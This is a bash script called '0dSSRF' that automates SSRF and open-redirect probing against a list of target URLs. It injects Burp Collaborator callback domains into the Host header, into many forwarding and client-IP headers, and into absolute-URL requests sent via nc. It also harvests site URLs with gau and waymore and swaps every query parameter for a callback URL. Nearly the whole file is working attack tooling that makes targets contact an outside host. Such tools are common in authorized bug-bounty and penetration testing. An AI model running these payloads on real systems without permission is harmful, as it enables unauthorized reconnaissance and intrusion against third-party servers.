#!/bin/bash

# Define colors for output
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
light_blue='\033[0;94m'
NC='\033[0m' # No Color

#info
#Hi, It's Kariem Gamal, aka 0d.MErCiFul, from team 0dYSs3y.?
#this tool is to test SSRF and Open Redirect vulnerabilities

# Function to print the intro message
print_intro() {
  echo -e "${GREEN} _______  ______            _______  _______  ______                _____  ${NC}"
  echo -e "${GREEN}(  ___  )(  __  \ |\     /|(  ____ \(  ____ \/ ___  \ |\     /|    / ___ \ ${NC}"
  echo -e "${GREEN}| (   ) || (  \  )( \   / )| (    \/| (    \/\/   \  \( \   / )   ( (   ) )${NC}"
  echo -e "${GREEN}| |   | || |   ) | \ (_) / | (_____ | (_____    ___) / \ (_) /     \/  / / ${NC}"
  echo -e "${GREEN}| |   | || |   | |  \   /  (_____  )(_____  )  (___ (   \   /         ( (  ${NC}"
  echo -e "${GREEN}| |   | || |   ) |   ) (         ) |      ) |      ) \   ) (          | |  ${NC}"
  echo -e "${GREEN}| (___) || (__/  )   | |   /\____) |/\____) |/\___/  /   | |    _     (_)  ${NC}"
  echo -e "${GREEN}(_______)(______/    \_/   \_______)\_______)\______/    \_/   (_)     _   ${NC}"
  echo -e "${GREEN}                                                                      (_)  ${NC}"
  echo -e ""
  echo -e "${YELLOW}                         Welcome To 0dSSRF👑, ${NC}"
  echo -e ""
  echo -e ""
}

# intro function
print_intro


# Function to inject Host header
inject_host_header() {
  echo -e "${light_blue}[*] Injecting Burp Collaborator into Host header...${NC}"
  # For Counter
  counter=0
  total_urls=$(wc -l < "$list")
  
  calculate_estimated_time $total_urls $requests_per_second
  sleep 1

  while IFS= read -r domain; do
    # Check if the domain is empty
    if [[ -z "$domain" ]]; then
      continue
    fi
    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
    current_time=$(date +"%H:%M:%S")
    # Increment the counter
    counter=$((counter + 1))
    # Send the HTTP GET request using curl (background) with additional headers
    curl -H "Host: h--$UD.$Collab"  "$domain" &> /dev/null &
    # Print the processed domain for reference
    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_host_header.log
    # Wait for $Delay seconds before next iteration
    sleep $delay
  done < "$list"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into Host header ${YELLOW}Finished ${NC}"
}

# Function to inject into common headers
inject_common_headers() {
  echo -e "${light_blue}[*] Injecting Burp Collaborator into common headers...${NC}"
  # For Counter
  counter=0
  total_urls=$(wc -l < "$list")
  
  calculate_estimated_time $total_urls $requests_per_second
  sleep 1

  while IFS= read -r domain; do
    # Check if the domain is empty
    if [[ -z "$domain" ]]; then
      continue
    fi
    current_time=$(date +"%H:%M:%S")
    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
    # Increment the counter
    counter=$((counter + 1))
    # Send the HTTP GET request using curl (background) with additional headers
    curl -H "From: root@From--$UD.$Collab" -H "User-Agent: Mozilla/5.0 root@User-Agent--$UD.$Collab" -H "Referer: http://Referer--$UD.$Collab/ref" -H "X-Original-URL: http://X-Original-URL--$UD.$Collab/" -H "X-Wap-Profile: http://X-Wap-Profile--$UD.$Collab/wap.xml" -H "Profile: http://Profile--$UD.$Collab/wap.xml" -H "X-Arbitrary: http://X-Arbitrary--$UD.$Collab/" -H "X-HTTP-DestinationURL: http://X-HTTP-DestinationURL--$UD.$Collab/" -H "X-Forwarded-Proto: http://X-Forwarded-Proto--$UD.$Collab/" -H "Origin: http://Origin--$UD.$Collab/" -H "X-Forwarded-Host: X-Forwarded-Host--$UD.$Collab" -H "X-Host: X-Host--$UD.$Collab" -H "Proxy-Host: Proxy-Host--$UD.$Collab" -H "Destination: Destination--$UD.$Collab" -H "Proxy: http://Proxy--$UD.$Collab/" -H "X-Forwarded-For: X-Forwarded-For--$UD.$Collab" -H "Contact: root@Contact--$UD.$Collab" -H "Forwarded: for=Forwardedfor--$UD.$Collab;by=Forwardedby--$UD.$Collab;host=Forwardedhost--$UD.$Collab" -H "X-Client-IP: X-Client-IP--$UD.$Collab" -H "Client-IP: Client-IP--$UD.$Collab" -H "True-Client-IP: True-Client-IP--$UD.$Collab" -H "CF-Connecting_IP: CF-Connecting-IP--$UD.$Collab" -H "X-Originating-IP: X-Originating-IP--$UD.$Collab" -H "X-Real-IP: X-Real-IP--$UD.$Collab" "$domain" &> /dev/null &    
    # Print the processed domain for reference
    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_common_headers.log
    # Wait for $Delay seconds before next iteration
    sleep $delay
  done < "$list"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into common headers ${YELLOW}Finished ${NC}"
}

# Function to inject into absolute URL
inject_absolute_url() {
  echo -e "${light_blue}[*] Injecting Burp Collaborator into absolute URL...${NC}"
  # For Counter
  counter=0
  total_urls=$(wc -l < "$list")
  
  calculate_estimated_time $total_urls $requests_per_second
  sleep 1

  while IFS= read -r domain; do
    # Check if the domain is empty
    if [[ -z "$domain" ]]; then
      continue
    fi
    current_time=$(date +"%H:%M:%S")
    U_Domain=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
    # Increment the counter
    counter=$((counter + 1))
    # Send the row HTTP GET request using nc (background)
    echo -e "GET http://a--$UD.$Collab/ HTTP/1.1\r\nHost: $U_Domain\r\n" | nc -q 1 $U_Domain 80  &> /dev/null &
    echo -e "GET http://a--$UD.$Collab/ HTTP/2\r\nHost: $U_Domain\r\n" | nc -q 1 $U_Domain 443 &> /dev/null &
    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_absolute_url.log
    # Wait for $Delay seconds before next iteration
    sleep $delay
  done < "$list"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into absolute URL ${YELLOW}Finished ${NC}"
}

#function to calculate_estimated_time_and_finish_time
function calculate_estimated_time() {
    total_requests=$1
    r_per_second=$2

    total_time=$((total_requests / r_per_second))

    hours=$((total_time / 3600))
    minutes=$(( (total_time % 3600) / 60))
    seconds=$(( (total_time % 60) ))

    current_time=$(date +%s)
    finish_time=$(date -d "@$((current_time + total_time))" +"%H:%M")

    echo -e "\033[33m[*] Estimated finish time: ${finish_time} (${hours}h, ${minutes}m, ${seconds}s.)\033[0m"
}

# Function to handle the "-e" option
handle_e_option() {
  cat $list | awk -F'[://" ]+' '{print $2}' | sort -u > domains.txt
  main_Domain=$(grep -o '[^./]*\.[^./]*$' domains.txt | sort -u)
  rm domains.txt
  # Call the main function
  inject_url_parameters "$main_Domain"
}

# Function to gather URLs and inject into parameters
inject_url_parameters() {
  echo -e "${light_blue}[*] Gathering URLs from $main_Domain...${NC}"
  printf $main_Domain | gau --subs --o gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js && echo -e "${GREEN}[*] Extracted URLs from gau${NC}"
  waymore -i $main_Domain -mode U -oU waymore.output -nd > /dev/null && echo -e "${GREEN}[*] Extracted URLs from waymore${NC}"
  cat gau.output waymore.output | uro > all_urls.log
  rm gau.output waymore.output
  cat all_urls.log | grep -o '.*\?.*=.*' > all_params
  cat all_params | uro -b jpg png js pdf css jpeg gif svg ttf woff > filtered_params.txt && echo -e "${GREEN}[*]Collecting Parms ${YELLOW}finished${NC}"
  echo "">>filtered_params.txt

  echo -e "${light_blue}[*] injecting Burp Collaborator into parameters...${NC}"
  counter=0
  total_urls=$(wc -l < "filtered_params.txt")
  # Loop through each URL in the file
  while IFS= read -r url; do
  # Skip empty lines
  if [[ -z "$url" ]]; then
    continue
  fi
  # Extract parameters and inject separately
  IFS='&' read -r -a params <<< "$(echo "$url" | grep -oP '(?<=\?).*')"
  UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
  # Base URL without parameters
  base_url=$(echo "$url" | grep -oP '^[^?]+')
  p=0
  counter=$((counter + 1))
  # Loop through each parameter
  for param in "${params[@]}"; do
    # Extract key and value
    key=$(echo "$param" | cut -d'=' -f1)
    value=$(echo "$param" | cut -d'=' -f2)
    current_time=$(date +"%H:%M:%S")
    p=$((p + 1))
    # Construct new URL with the parameter injected
    new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://p--$UD.$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
    # Send the request
    curl -L "$new_url" &> /dev/null &
    echo -e "${light_blue}[$counter/$total_urls](p$p) ${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a inject_url_parameters.log
    sleep $delay
  done
  done < "filtered_params.txt"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into parameters ${YELLOW}Finished ${NC}"
}

# Parse command-line options
while getopts "hepas:c:l:" opt; do
  case $opt in
    h) stages+=("host") ;;
    e) stages+=("headers") ;;
    p) stages+=("parameters") ;;
    a) stages+=("absolute") ;;
    s) requests_per_second="$OPTARG"
       delay=$(echo "scale=2; 1/$OPTARG" | bc) ;;
    c) Collab="$OPTARG" ;;
    l) list="$OPTARG" ;;
    \?) echo "Invalid option -$OPTARG" >&2; exit 1 ;;
  esac
done

# Ensure required options are provided
if [ -z "$Collab" ] || [ -z "$delay" ] || [ -z "$list" ]; then
  echo "Usage: $0 -h|-e|-p -l urls_list.txt -c collaborator_id -s requests_per_second"
  exit 1
fi

# Run the selected stages
for stage in "${stages[@]}"; do
  case $stage in
    host) inject_host_header ;;
    headers) inject_common_headers "$Collab" ;;
    parameters) handle_e_option ;;
    absolute) inject_absolute_url ;;
  esac
done
